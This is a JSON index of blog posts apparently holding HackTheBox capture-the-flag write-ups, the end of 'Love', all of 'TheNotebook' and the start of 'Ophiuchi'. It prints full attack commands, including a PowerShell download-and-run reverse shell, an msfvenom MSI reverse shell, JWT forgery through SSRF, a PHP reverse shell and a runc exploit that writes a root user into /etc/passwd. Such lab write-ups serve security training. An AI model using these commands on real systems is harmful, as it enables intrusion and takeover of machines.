‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.105 -Port 10099' &gt;&gt; revshell.ps1  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..   To download and execute the reverse shell: http://10.129.128.110/images/ws.php?cmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105/revshell.ps1')\"   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.105] from (UNKNOWN) [10.129.128.110] 64516 Windows PowerShell running as user Phoebe on LOVE Copyright (C) 2015 Microsoft Corporation. All rights reserved.  PS C:\\xampp\\htdocs\\omrs\\images&gt;whoami love\\phoebe   Privilege Escalation Local enumeration reveals that the AlwaysInstallElevated flag was enabled both for the current user and the local machine, permitting to install malicious .msi with SYSTEM privileges: C:\\temp&gt;reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer     AlwaysInstallElevated    REG_DWORD    0x1   C:\\temp&gt;reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer  HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer     AlwaysInstallElevated    REG_DWORD    0x1   C:\\temp&gt;reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer  HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer     AlwaysInstallElevated    REG_DWORD    0x1   Generated the malicious installer: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.105 LPORT=10099 -f msi -o privesc.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of msi file: 159744 bytes Saved as: privesc.msi  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ sudo impacket-smbserver kali . -smb2support                                           [sudo] password for kali: Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation ...   Downloaded and installed the malicious file: C:\\temp&gt;copy \\\\10.10.14.105\\kali\\privesc.msi privesc.msi copy \\\\10.10.14.105\\kali\\privesc.msi privesc.msi         1 file(s) copied.  C:\\temp&gt;msiexec /quiet /qn /i privesc.msi msiexec /quiet /qn /i privesc.msi   Obtained the reverse shell: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Love/exploit] ‚îî‚îÄ$ nc -nlvp 10099                                                                             listening on [any] 10099 ... connect to [10.10.14.105] from (UNKNOWN) [10.129.128.110] 64526 Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved.  C:\\WINDOWS\\system32&gt;whoami &amp;&amp; hostname &amp;&amp; type C:\\users\\administrator\\desktop\\root.txt &amp;&amp; ipconfig /all whoami &amp;&amp; hostname &amp;&amp; type C:\\users\\administrator\\desktop\\root.txt &amp;&amp; ipconfig /all nt authority\\system Love 909c70fd07a0&lt;redacted&gt;  Windows IP Configuration     Host Name . . . . . . . . . . . . : Love    Primary Dns Suffix  . . . . . . . :    Node Type . . . . . . . . . . . . : Hybrid    IP Routing Enabled. . . . . . . . : No    WINS Proxy Enabled. . . . . . . . : No    DNS Suffix Search List. . . . . . : .htb  Ethernet adapter Ethernet0 2:     Connection-specific DNS Suffix  . : .htb    Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter    Physical Address. . . . . . . . . : 00-50-56-B9-83-FA    DHCP Enabled. . . . . . . . . . . : Yes    Autoconfiguration Enabled . . . . : Yes    IPv4 Address. . . . . . . . . . . : 10.129.128.110(Preferred)    Subnet Mask . . . . . . . . . . . : 255.255.0.0    Lease Obtained. . . . . . . . . . : Wednesday, May 5, 2021 5:41:36 AM    Lease Expires . . . . . . . . . . : Wednesday, May 5, 2021 12:21:52 PM    Default Gateway . . . . . . . . . : 10.129.0.1    DHCP Server . . . . . . . . . . . : 10.129.0.1    DNS Servers . . . . . . . . . . . : 1.1.1.1                                        8.8.8.8    NetBIOS over Tcpip. . . . . . . . : Enabled     Trophy You could claim that anything's real if the only basis for believing in it is that nobody's proved it doesn't exist! - J.K. Rowling"
  },
  
  {
    "title": "HackTheBox - TheNotebook",
    "url": "/posts/thenotebook/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-07-31 00:00:00 +0200",
    "content": "Introduction TheNoteBook is a medium difficulty Linux box running a custom web application vulnerable to authorization bypass caused by a SSRF that allows to validate arbitrary JWT. Once authenticated the application suffers a bug that allows to execute PHP file, resulting in RCE. Excessive permissions assigned to the noah‚Äôs home backup archive allows to copy and extract it, resulting in the leakage of noah‚Äôs SSH private key. Finally, Noah is allowed to execute command within a docker container. Because the runc software version used in Docker before 18.09.2 suffers a file-descriptor mishandling, it is possible to leverage the CVE-2019-5736 in order to** inject a malicious root user** and then login, obtaining high privileges on the target.  Improved skills    Validation of arbitrary JWT   SSRF Authorization Bypass   Docker Privilege Escalation (CVE-2019-5736)   Used tools    nmap   gobuster   jwt.io   tcpdump   Video     Enumeration Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/TheNotebook] ‚îî‚îÄ$ sudo nmap -sS -p- 10.10.10.230 -oN scans/all-tcp-ports.txt -v ... PORT      STATE    SERVICE 22/tcp    open     ssh 80/tcp    open     http 10010/tcp filtered rxapi ...   Enumerated open TCP open ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/TheNotebook] ‚îî‚îÄ$ sudo nmap -sV -sT -sC -A -p22,80 10.10.10.230 -oN scans/tcp-open-ports.txt ... PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) |   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open  http    nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port ...   Nmap discovered only two services exposed by the target: an OpenSSH 7.6p1 service running on port 22 which disclosed the exact build version and a nginx 1.14.0 running on port 80. Because SSH usually does not offer a large attack surface, enumeration of target was primary focused on port 80.  Browsed port 80:    Enumerated web directories and files: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/TheNotebook] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.230 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt ... /admin                (Status: 403) [Size: 9] /logout               (Status: 302) [Size: 209] [--&gt; http://10.10.10.230/] /login                (Status: 200) [Size: 1250] /register             (Status: 200) [Size: 1422]   The site offered the possibility to register an account so one was created:    There were very few entry points, however, the application used JWT to authenticate users. Usually bad implementation of JWT allows authentication bypass or application privilege escalation, therefore it is always good to check them:    Decoding the JWT using jwt.io it came up that the user privileges are contained inside the token as well as the path to the private key used to validate it. {   \"typ\": \"JWT\",   \"alg\": \"RS256\",   \"kid\": \"http://localhost:7070/privKey.key\" } {   \"username\": \"maoutis\",   \"email\": \"maoutis@hackthebox.htb\",   \"admin_cap\": 0 }   Editing the kid field it was possible to made the server contact a different target: {   \"typ\": \"JWT\",   \"alg\": \"RS256\",   \"kid\": \"http://10.10.14.24:7070/privKey.key\" }  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ sudo tcpdump -i tun0 -n port 7070                         [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 17:47:46.263302 IP 10.10.10.230.38902 &gt; 10.10.14.24.7070: Flags [S], seq 2910523052, win 64240, options [mss 1357,sackOK,TS val 1904549514 ecr 0,nop,wscale 7], length 0 17:47:46.263348 IP 10.10.14.24.7070 &gt; 10.10.10.230.38902: Flags [R.], seq 0, ack 2910523053, win 0, length 0   Foothold Due to the SSRF vulnerability, the server can be tricked into using an arbitrary key to validate the token. This issue can be exploited by making the server accept an arbitrary token with high privileges, allowing to authenticate to the application as administrators instead of standard users.  Taking inspiration from the following Akamai article, a pair of rsa keys was created: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/TheNotebook/exploit/keys] ‚îî‚îÄ$ openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub writing RSA key  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/TheNotebook/exploit/keys] ‚îî‚îÄ$ openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem  writing RSA key   Then following this other Akamai article an arbitrary JWT containing admin privileges was created : ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ echo -n '{\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://10.10.14.24/privKey.key\"}' | base64 | sed s/\\+/-/ | sed -E s/=+$// &gt; token.header  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ echo -n '{\"username\":\"maoutis\",\"email\":\"maoutis@hackthebox.htb\",\"admin_cap\":1}' | base64 | sed s/\\+/-/ | sed -E s/=+$// &gt; token.payload  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ cat token.* eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2 S2V5LmtleSJ9 eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJh ZG1pbl9jYXAiOjF9  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9\" | openssl dgst -sha256 -binary -sign  keys/jwtRSA256-private.pem | openssl enc -base64 | tr -d '\\n=' | tr -- '+/' '-_' &gt; token.signature  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ cat token.signature dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA\" &gt; token.jwt   The RSA private key was renamed to the value specified within the token and then it was hosted: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/TheNotebook/exploit/keys] ‚îî‚îÄ$ cp jwtRSA256-private.pem privKey.key  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/TheNotebook/exploit/keys] ‚îî‚îÄ$ sudo python3 -m http.server 80   The cookie containing the current JWT was replaced with the self signed one and then the /admin page was visited: GET /admin HTTP/1.1 Host: 10.10.10.230 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: uuid=fc6beb6e-c388-4e19-b0d7-9587a82dac02; auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0      Once logged as administrators all the other notes were enumerated, discovering a bug that allows RCE:     A PHP reverse shell was so copied, adjusted and uploaded on the server: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ cp /usr/share/webshells/php/php-reverse-shell.php rev.php  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ nano rev.php ... $ip = '10.10.14.24';  // CHANGE THIS $port = 10099;       // CHANGE THIS ...     Finally a reverse shell was obtained clicking on the view button: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/TheNotebook] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.230] 43694 Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux  22:52:28 up  7:50,  0 users,  load average: 0.00, 0.00, 0.00 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@thenotebook:/$ ^Z zsh: suspended  nc -nlvp 10099  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/TheNotebook] ‚îî‚îÄ$ stty raw -echo; fg  [1]  + continued  nc -nlvp 10099  www-data@thenotebook:/$ export TERM=xterm www-data@thenotebook:/$ stty rows 60 columns 235   Lateral Movement to noah Enumerated local users: www-data@thenotebook:/$ cat /etc/passwd | grep -v nologin root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync lxd:x:105:65534::/var/lib/lxd/:/bin/false pollinate:x:109:1::/var/cache/pollinate:/bin/false noah:x:1000:1000:Noah:/home/noah:/bin/bash   Enumerated backup files: www-data@thenotebook:/var/backups$ ls -al total 60 drwxr-xr-x  2 root root  4096 Apr 30 15:01 . drwxr-xr-x 14 root root  4096 Feb 12 06:52 .. -rw-r--r--  1 root root 33252 Feb 24 08:53 apt.extended_states.0 -rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz -rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz -rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz   Excessive file permission on home.tar.gz allowed to copy the archive within /tmp and extract its contents, leaking noah ssh keys: www-data@thenotebook:/var/backups$ cp home.tar.gz /tmp www-data@thenotebook:/var/backups$ cd /tmp www-data@thenotebook:/tmp$ gunzip home.tar.gz www-data@thenotebook:/tmp$ tar -xf home.tar www-data@thenotebook:/tmp$ cd home www-data@thenotebook:/tmp/home$ ls noah www-data@thenotebook:/tmp/home$ cd noah/ www-data@thenotebook:/tmp/home/noah$ ls -al total 32 drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 . drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 .. -rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout -rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg -rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh www-data@thenotebook:/tmp/home/noah$ cd .ssh www-data@thenotebook:/tmp/home/noah/.ssh$ ls authorized_keys  id_rsa  id_rsa.pub   Noah private key was then used to access the box: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/loot] ‚îî‚îÄ$ ssh noah@10.10.10.230 -i noah.key ... noah@thenotebook:~$ id uid=1000(noah) gid=1000(noah) groups=1000(noah)   Privilege Escalation Enumerated sudo capabilities for noah: noah@thenotebook:~$ sudo -l Matching Defaults entries for noah on thenotebook:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User noah may run the following commands on thenotebook:     (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*   Connected to the docker container and discovered that high privileges was provided: noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash root@7b2fd74847ce:/opt/webapp# id uid=0(root) gid=0(root) groups=0(root)   Discovered that runc was available: ... [+] Checking if runc is available [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                             runc was found in /usr/sbin/runc, you may be able to escalate privileges with it ...   Googling around for Docker privilege escalation techniques, an interesting article from HackTricks was found, talking about a Runc exploit (CVE-2019-5736) that allows elevation of privileges.     runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.   Controlling the software versions of the target machine it was discovered that the box was vulnerable to that CVE: noah@thenotebook:~$ runc -v runc version 1.0.0~rc6+dfsg1 commit: 1.0.0~rc6+dfsg1-3 spec: 1.0.1 noah@thenotebook:~$ docker -v Docker version 18.06.0-ce, build 0ffa825   On the attacker machine the PoC from Frichetten was downloaded, the payload was adjusted to inject a malicious root user, and then hosted for the download on the target: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go -O privesc.go ... ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ nano privesc.go ... var payload = \"#!/bin/bash \\n echo 'root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\" ... fd, err := os.Create(\"/bin/bash\") ... fmt.Println(\"[+] Overwritten /bin/bash successfully\") ...  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ go build privesc.go  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80  [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   The exploit was downloaded inside the docker container and executed: noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash root@719a30d9c793:/opt/webapp# wget 10.10.14.24/privesc --2021-05-01 11:24:09--  http://10.10.14.24/privesc ... root@719a30d9c793:/opt/webapp# chmod +x privesc root@719a30d9c793:/opt/webapp# ./privesc [+] Overwritten /bin/bash successfully  &lt; exploit paused &gt;   From another SSH session the exploit was then triggered:  Session 2: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/TheNotebook/loot] ‚îî‚îÄ$ ssh noah@10.10.10.230 -i noah.key ... noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash No help topic for '/bin/bash'   Session 1: ... [+] Overwritten /bin/bash successfully  &lt; exploit paused &gt; [+] Found the PID: 34 [+] Successfully got the file handle [+] Successfully got write handle &amp;{0xc0000a8180}   Finally it was escalated to root switching to the injected root2 user: noah@thenotebook:~$ su root2 Password: evil root@thenotebook:/home/noah# id &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a uid=0(root) gid=0(root) groups=0(root) thenotebook 2328e98b072c67c6d418ae24d00523d3 docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255         ether 02:42:d6:10:3f:8a  txqueuelen 0  (Ethernet)         RX packets 12886  bytes 699043 (699.0 KB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 19288  bytes 32590700 (32.5 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.230  netmask 255.255.255.0  broadcast 10.10.10.255         ether 00:50:56:b9:d5:cf  txqueuelen 1000  (Ethernet)         RX packets 39715  bytes 36782225 (36.7 MB)         RX errors 0  dropped 171  overruns 0  frame 0         TX packets 35339  bytes 2907270 (2.9 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         loop  txqueuelen 1000  (Local Loopback)         RX packets 4  bytes 200 (200.0 B)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 4  bytes 200 (200.0 B)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  veth9864dad: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         ether 32:f8:e1:c2:77:95  txqueuelen 0  (Ethernet)         RX packets 0  bytes 0 (0.0 B)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 13  bytes 546 (546.0 B)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  vethff601c6: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         ether da:d1:0c:17:2a:4b  txqueuelen 0  (Ethernet)         RX packets 0  bytes 0 (0.0 B)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 0  bytes 0 (0.0 B)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   Trophy A bug is never just a mistake. It represents something bigger. An error of thinking. That makes you who you are.   - Elliot Alderson (Mr. Robot)"
  },
  
  {
    "title": "HackTheBox - Ophiuchi",
    "url": "/posts/ophiuchi/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox, deserialization",
    "date": "2021-07-03 00:00:00 +0200",
    "content": "Introduction Ophiuchi is a medium difficulty Linux box hosting a YAML parser vulnerable to a YAML deserialization attacks leading to remote code execution. Once inside the box it was possible to leak some credentials and reuse them to access the target with user privileges. Finally, privilege escalation to root was achieved abusing a go script containing relative path. After reversing and patching a wasm file it was possible to hijack relative path reference within the go script and execute arbitrary code.  Improved skills:    YAML Deserialization Attacks   Code Review   Decompile and patch wasm file   Used tools:    nmap   gobuster   netcat   wabt (WebAssembly Binary Toolkit)     Enumeration Scanned all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ sudo nmap -p- -sS 10.10.10.227 -oN scans/all-tcp-ports.txt -v -Pn ... PORT     STATE SERVICE 22/tcp   open  ssh 8080/tcp open  http-proxy   Enumerated open tcp ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ sudo nmap -p22,8080 -sV -sT -sC -A 10.10.10.227 -oN scans/open-tcp-ports.txt -Pn ... PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA) |   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA) |_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519) 8080/tcp open  http    Apache Tomcat 9.0.38 |_http-title: Parse YAML ...   Nmap discovered only two open ports: a SSH service running on port 22 and an Apache Tomcat running on port 8080. Because usually SSH offers a lower attack surface compared to web application, port 8080 was the most interesting target to start with.  Enumerated port 8080 using a browser:   Enumerated web directories and files: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.227:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -oN scans/p80-directories.txt -f ... /manager/             (Status: 302) [Size: 0] [--&gt; /manager/html] /yaml/                (Status: 200) [Size: 8042] /plain]/              (Status: 400) [Size: 762] /[/                   (Status: 400) [Size: 762] /]/                   (Status: 400) [Size: 762] /quote]/              (Status: 400) [Size: 762] Progress: 23982 / 30001 (79.94%)                                [ERROR] 2021/05/02 12:58:50 [!] parse \"http://10.10.10.227:8080/error\\x1f_log/\": net/url: invalid control character in URL /extension]/          (Status: 400) [Size: 762] /[0-9]/               (Status: 400) [Size: 762]  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.227:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -oN scans/p80-files.txt /.                    (Status: 200) [Size: 8042] /index.jsp            (Status: 200) [Size: 8042]   A known vulnerability of tomcat servers is the use of default credentials for manager and host-manager areas. Because directory enumeration revealed the existence of these  area, access with default credentials was tried but with no luck.  Testing the YAML parser for unexpected behavior, an Internal Server Error was obtained, which disclosed verbose error messages and the component used by the parser.  Foothold Searching on Google it was possible to find some interesting articles talking about a deserialization vulnerability (CVE-2017-1000207) impacting the SnakeYaml software, the exact same component used by the YAML parser.  https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/ https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858  CVE-2017-1000207:    A vulnerability in Swagger-Parser‚Äôs version &lt;= 1.0.30 and Swagger codegen version &lt;= 2.2.2 yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the ‚Äògenerate‚Äô and ‚Äòvalidate‚Äô command in swagger-codegen (&lt;= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.   As discussed in the articles, sending a specific payload to the parser allowed to obtain a request from it. The Poc used for the test was the following: 